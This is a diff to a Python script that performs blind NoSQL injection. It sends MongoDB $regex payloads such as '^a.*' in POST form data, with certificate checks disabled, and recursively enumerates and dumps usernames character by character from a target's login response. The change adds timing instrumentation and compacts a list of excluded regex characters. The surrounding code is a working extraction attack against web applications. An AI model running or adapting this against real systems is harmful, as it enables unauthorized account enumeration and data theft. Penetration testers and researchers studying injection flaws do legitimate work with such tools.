@@ -6,6 +6,7 @@ import random
 import string
 from requests_html import HTMLSession
 from termcolor import colored
+import time
 
 try:
     from BeautifulSoup import BeautifulSoup
@@ -137,7 +138,10 @@ def slinearPost(nsi):
 def getPrefix(nsi, form_data):
     prefixUsernames = []
     alphabet = list(string.ascii_letters) + list(string.digits)
-
+    start_time = time.time()
+    total_time = 0
+    timesPrefix = []
+    
     for c in alphabet:
         # for element in form_data:
         #     if "$regex" in element:
@@ -145,16 +149,26 @@ def getPrefix(nsi, form_data):
         iterateParam(form_data, "^" + str(c) + ".*")
         r = requests.post(nsi.url, data=form_data, verify=False)
         if nsi.successIdentifier in r.text:
+            end_time = time.time()
+            time_taken = end_time - start_time
+            total_time += time_taken
             prefixUsernames.append(c)
+            timesPrefix.append({
+                c: time_taken
+            })
+            print(colored(f"Time taken for {c}: {time_taken}", "yellow", attrs=["blink"]))
 
+    print(colored(f"Total time get username prefixes: {total_time}", "yellow", attrs=["blink"]))
+    print(timesPrefix)
     for username in prefixUsernames:
         dumpData(nsi, username, form_data)
 
 
 # recursive
-def dumpData(nsi, username, form_data):
+def dumpData(nsi, username, form_data, total_time = 0):
     alphabet = list(string.ascii_letters) + list(string.digits)
     updated_form_data = {}
+    start_time = time.time()
 
     for element in form_data:
         if "$regex" in element:
@@ -164,14 +178,25 @@ def dumpData(nsi, username, form_data):
             updated_form_data[element] = form_data[element]
         r = requests.post(nsi.url, data=updated_form_data, verify=False)
         if nsi.successIdentifier in r.text:
-            print("Result: "+username)
-
+            print(f"Result: {username} | Total Time: {total_time}")
+            # start_time = time.time()
+            # total_time = 0
+    
     while True:
         for c in alphabet:
             iterateParam(form_data, "^" + str(username + c) + ".*")
+            # print("TRIGERRED" + username)
             r = requests.post(nsi.url, data=form_data, verify=False)
+
             if nsi.successIdentifier in r.text:
-                dumpData(nsi, username + c, form_data)
+                end_time = time.time()
+                time_taken = end_time - start_time
+                total_time += time_taken
+                dumpData(nsi, username + c, form_data, total_time)
+
+                print(colored(f"Time taken for append {c}: {time_taken}", "yellow", attrs=["blink"]))
+                start_time = time.time()
+                total_time = 0
                 
             if c == alphabet[-1]:
                 return
@@ -236,22 +261,7 @@ def slinearGet(nsi):
 
     for x in range(length):
         for c in string.printable:
-            if c not in [
-                "*",
-                "+",
-                ".",
-                "?",
-                "|",
-                "'",
-                '"',
-                "&",
-                " ",
-                "(",
-                ")",
-                "[",
-                "]",
-                "\\",
-            ]:
+            if c not in ["*","+",".","?","|","'",'"',"&"," ","(",")","[","]","\\"]:
                 form_data = {}
                 for element in nsi.params:
                     if "*" in element:
